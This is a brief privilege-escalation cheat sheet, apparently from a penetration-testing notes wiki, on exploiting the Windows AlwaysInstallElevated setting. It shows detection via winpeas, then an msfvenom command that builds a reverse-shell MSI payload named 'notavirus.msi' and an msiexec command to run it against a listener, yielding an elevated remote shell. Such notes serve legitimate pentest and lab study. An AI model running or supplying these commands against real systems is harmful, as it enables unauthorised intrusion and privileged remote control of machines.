# AlwaysInstallElevated

### Identifying

Running winpeas gives an output like this

![](<../.gitbook/assets/image (1).png>)

### Exploiting

#### _Step1_

Create a msi exe using msfvenom

_`msfvenom -p windows/x64/shell_reverse_tcp LHOST= LPORT= -f msi > notavirus.msi`_

_``_

#### _Step2_

Transfer it to windows and run it after setting up a listener

_`msiexec /i "C:\Users\Phoebe\Desktop\notavirus.msi"`_
